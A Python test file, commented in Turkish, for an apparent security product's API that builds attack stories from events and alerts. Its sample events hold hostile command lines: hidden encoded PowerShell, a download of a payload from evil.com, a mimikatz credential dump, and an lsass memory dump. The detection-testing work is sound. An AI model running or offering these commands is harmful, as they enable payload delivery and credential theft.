"""
tests.test_story_preview_api
===============================
POST /api/story/preview API endpoint testleri.
FastAPI TestClient ile çalışır — auth dependency'leri override edilir.
DB erişimi yok, tamamen in-memory.
"""

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.api.routes_story import _auth_dependency
from app.core.security import get_current_tenant_id


# ---------------------------------------------------------------------------
# Auth Override Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def _override_auth():
    """Auth dependency'lerini override et — DB'siz test."""

    async def _mock_user():
        return "test-analyst"

    async def _mock_tenant():
        return "test-tenant"

    app.dependency_overrides[_auth_dependency] = _mock_user
    app.dependency_overrides[get_current_tenant_id] = _mock_tenant
    yield
    app.dependency_overrides.clear()


@pytest.fixture
def client():
    return TestClient(app)


# ---------------------------------------------------------------------------
# Test Helpers
# ---------------------------------------------------------------------------

def _powershell_chain_raw():
    """PowerShell chain rule'ını tetikleyecek 2 raw event dict."""
    return [
        {
            "type": "PROCESS_START",
            "hostname": "WS-01",
            "user": "admin",
            "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgA",
            "severity": "HIGH",
            "risk_score": 75,
        },
        {
            "type": "PROCESS_START",
            "hostname": "WS-01",
            "user": "admin",
            "command_line": "powershell.exe Invoke-WebRequest http://evil.com/payload -OutFile c:\\temp\\p.exe",
            "severity": "HIGH",
            "risk_score": 80,
        },
    ]


def _credential_chain_alerts():
    """Credential dumping chain tetikleyecek alert dict'ler."""
    return [
        {
            "id": "alert-001",
            "hostname": "DC-01",
            "username": "attacker",
            "type": "PROCESS_START",
            "command_line": "mimikatz.exe privilege::debug",
            "risk_score": 90,
            "severity": "CRITICAL",
            "details": "sekurlsa logonpasswords",
            "rule": "Credential Dumping",
        },
        {
            "id": "alert-002",
            "hostname": "DC-01",
            "username": "attacker",
            "type": "PROCESS_START",
            "command_line": "procdump.exe -ma lsass.exe lsass.dmp",
            "risk_score": 85,
            "severity": "HIGH",
            "details": "lsass dump",
            "rule": "LSASS Access",
        },
    ]


# ---------------------------------------------------------------------------
# Raw Events → Story
# ---------------------------------------------------------------------------

class TestPreviewRawEvents:

    def test_raw_events_produces_story(self, client):
        """POST /api/story/preview raw_events → attack story üretmeli."""
        resp = client.post("/api/story/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["summary"]["total_events"] == 2
        assert data["summary"]["total_groups"] >= 1
        assert data["summary"]["total_stories"] >= 1
        assert len(data["attack_stories"]) >= 1
        assert data["warnings"] == []

    def test_raw_events_story_has_title(self, client):
        """Üretilen story'nin title ve severity'si olmalı."""
        resp = client.post("/api/story/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        story = data["attack_stories"][0]
        assert "title" in story
        assert "severity" in story
        assert "risk_score" in story
        assert story["risk_score"] > 0


# ---------------------------------------------------------------------------
# Alerts → Story
# ---------------------------------------------------------------------------

class TestPreviewAlerts:

    def test_alerts_produces_story(self, client):
        """POST /api/story/preview alerts → attack story üretmeli."""
        resp = client.post("/api/story/preview", json={
            "source_type": "alerts",
            "items": _credential_chain_alerts(),
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["summary"]["total_events"] == 2
        assert len(data["attack_stories"]) >= 1


# ---------------------------------------------------------------------------
# Command Results
# ---------------------------------------------------------------------------

class TestPreviewCommandResults:

    def test_command_results_returns_200(self, client):
        """Command results normalize edilir, story üretmeyebilir."""
        resp = client.post("/api/story/preview", json={
            "source_type": "command_results",
            "items": [
                {
                    "command_id": "cmd-001",
                    "action": "isolate",
                    "target_hostname": "WS-01",
                    "status": "completed",
                    "success": True,
                    "message": "Host isolated",
                },
            ],
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["summary"]["total_events"] == 1


# ---------------------------------------------------------------------------
# Normalized Events
# ---------------------------------------------------------------------------

class TestPreviewNormalizedEvents:

    def test_normalized_events_produces_story(self, client):
        """Pre-built normalized event dict → correlation → story."""
        items = [
            {
                "event_type": "process_execution",
                "tenant_id": "test-tenant",
                "hostname": "WS-01",
                "username": "admin",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -nop -w hidden -enc abc123",
                "risk_score": 75,
                "severity": "HIGH",
                "mitre_tactic": "Execution",
                "mitre_technique": "T1059.001",
            },
            {
                "event_type": "process_execution",
                "tenant_id": "test-tenant",
                "hostname": "WS-01",
                "username": "admin",
                "process_name": "powershell.exe",
                "command_line": "powershell.exe Invoke-WebRequest http://evil.com/p -OutFile c:\\p.exe",
                "risk_score": 80,
                "severity": "HIGH",
                "mitre_tactic": "Execution",
                "mitre_technique": "T1059.001",
            },
        ]
        resp = client.post("/api/story/preview", json={
            "source_type": "normalized_events",
            "items": items,
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["summary"]["total_events"] == 2
        assert len(data["attack_stories"]) >= 1

    def test_normalized_events_invalid_item_warning(self, client):
        """Geçersiz normalized event dict → warning, crash yok."""
        items = [
            {
                "event_type": "process_execution",
                "tenant_id": "t-1",
                "hostname": "WS-01",
                "command_line": "notepad.exe",
                "risk_score": 5,
            },
            {
                "INVALID_FIELD": "bad data",
            },
        ]
        resp = client.post("/api/story/preview", json={
            "source_type": "normalized_events",
            "items": items,
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["summary"]["total_events"] == 1
        assert len(data["warnings"]) >= 1
        assert "index=1" in data["warnings"][0]


# ---------------------------------------------------------------------------
# Unsupported Source Type → 400
# ---------------------------------------------------------------------------

class TestPreviewUnsupportedSourceType:

    def test_unsupported_source_type_returns_400(self, client):
        """Bilinmeyen source_type → HTTP 400."""
        resp = client.post("/api/story/preview", json={
            "source_type": "INVALID_TYPE",
            "items": [{"foo": "bar"}],
        })
        assert resp.status_code == 400
        assert "Desteklenmeyen source_type" in resp.json()["detail"]

    def test_unsupported_source_type_detail_includes_name(self, client):
        """400 response detail, gönderilen source_type'ı içermeli."""
        resp = client.post("/api/story/preview", json={
            "source_type": "BOGUS",
            "items": [],
        })
        assert resp.status_code == 400
        assert "BOGUS" in resp.json()["detail"]


# ---------------------------------------------------------------------------
# Empty Items → 200
# ---------------------------------------------------------------------------

class TestPreviewEmptyItems:

    def test_empty_items_returns_200(self, client):
        """Boş items listesi → boş result, HTTP 200."""
        resp = client.post("/api/story/preview", json={
            "source_type": "raw_events",
            "items": [],
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["summary"]["total_events"] == 0
        assert data["summary"]["total_groups"] == 0
        assert data["summary"]["total_stories"] == 0
        assert data["attack_stories"] == []

    def test_empty_items_no_crash(self, client):
        """Tüm source_type'lar boş items ile çalışmalı."""
        for source_type in ["raw_events", "alerts", "command_results", "normalized_events"]:
            resp = client.post("/api/story/preview", json={
                "source_type": source_type,
                "items": [],
            })
            assert resp.status_code == 200


# ---------------------------------------------------------------------------
# Auth Rejected
# ---------------------------------------------------------------------------

class TestPreviewAuthRejected:

    def test_unauthenticated_rejected(self, client):
        """Auth override temizlenince → 401."""
        app.dependency_overrides.clear()

        resp = client.post("/api/story/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        assert resp.status_code == 401


# ---------------------------------------------------------------------------
# Summary Correctness
# ---------------------------------------------------------------------------

class TestPreviewSummary:

    def test_summary_fields_present(self, client):
        """Summary tüm beklenen alanları içermeli."""
        resp = client.post("/api/story/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        summary = data["summary"]
        assert "total_events" in summary
        assert "total_groups" in summary
        assert "total_stories" in summary
        assert "max_risk_score" in summary
        assert "highest_severity" in summary
        assert "affected_hosts" in summary
        assert "affected_users" in summary
        assert "tactics" in summary
        assert "techniques" in summary

    def test_summary_risk_score_positive(self, client):
        """Story üretildiyse risk_score > 0 olmalı."""
        resp = client.post("/api/story/preview", json={
            "source_type": "raw_events",
            "items": _powershell_chain_raw(),
        })
        data = resp.json()
        assert data["summary"]["max_risk_score"] > 0
        assert data["summary"]["highest_severity"] in ("HIGH", "CRITICAL")
